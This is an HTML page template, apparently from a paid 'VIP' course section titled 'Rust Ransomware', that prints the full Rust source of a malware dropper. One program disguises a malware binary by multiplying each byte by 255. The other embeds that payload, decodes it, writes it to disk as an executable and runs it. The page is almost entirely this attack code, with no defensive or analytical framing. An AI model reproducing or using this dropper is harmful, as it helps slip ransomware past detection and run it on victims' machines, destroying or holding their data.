{{ define "sub-content" }}

<nav aria-label="breadcrumb">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="/vip">VIP</a></li>
    <li class="breadcrumb-item"><a href="/vip/projects">Projects</a></li>
    <li class="breadcrumb-item active">{{ t "Rust Ransomware" . }}</li>
  </ol>
</nav>

<h3>Malware dropper</h3>
<p>
</p>

<p>Full source code (rust):</p>

<h4 class="mt-5 mb-3">obfuscator/main.rs</h4>
<!-- Code begin -->
<div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
    <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></pre></td>
        <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">use</span> std::fs;

<span style="color:#75715e">// Malware obfuscator takes the released &#34;malware&#34; and multiply each bytes by 255
</span><span style="color:#75715e"></span><span style="color:#75715e">// to produce the &#34;malware_obfuscated&#34; file that will be embedded inside the &#34;dropper&#34;
</span><span style="color:#75715e"></span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">main</span>() {
    <span style="color:#66d9ef">let</span> content <span style="color:#f92672">=</span> fs::read(<span style="color:#e6db74">&#34;./malware&#34;</span>).unwrap();
    <span style="color:#66d9ef">let</span> obfuscated: Vec<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> content.iter().map(<span style="color:#f92672">|</span>c<span style="color:#f92672">|</span> c.wrapping_mul(<span style="color:#ae81ff">255</span>)).collect();
    fs::write(<span style="color:#e6db74">&#34;./malware_obfuscated&#34;</span>, obfuscated).unwrap();
}

</pre></td></tr></table>
</div>
<!-- Code end -->

<h4 class="mt-5 mb-3">dropper/main.rs</h4>

<!-- Code begin -->
<div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
  <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></pre></td>
    <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">use</span> std::fs;
<span style="color:#66d9ef">use</span> std::io::Write;
<span style="color:#66d9ef">use</span> std::os::unix::fs::OpenOptionsExt;
<span style="color:#66d9ef">use</span> std::process::Command;

<span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">main</span>() {
    <span style="color:#66d9ef">let</span> ransomware_bytes <span style="color:#f92672">=</span> include_bytes<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#34;malware_obfuscated&#34;</span>);
    <span style="color:#75715e">// de-obfuscate embedded binary
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> decrypted: Vec<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> ransomware_bytes
        .iter()
        .map(<span style="color:#f92672">|</span>c<span style="color:#f92672">|</span> c.wrapping_mul(<span style="color:#ae81ff">255</span>))
        .collect();
    <span style="color:#75715e">// drop the binary on the machine
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> f <span style="color:#f92672">=</span> fs::OpenOptions::new()
        .create(<span style="color:#66d9ef">true</span>)
        .write(<span style="color:#66d9ef">true</span>)
        .mode(<span style="color:#ae81ff">0o777</span>)
        .open(<span style="color:#e6db74">&#34;malware_dropped&#34;</span>)
        .unwrap();
    f.write(decrypted.as_slice()).unwrap();
    <span style="color:#75715e">// Execute the binary
</span><span style="color:#75715e"></span>    Command::new(<span style="color:#e6db74">&#34;./malware_dropped&#34;</span>).output().unwrap();
}

</pre></td></tr></table>
</div>
<!-- Code end -->

{{ end }}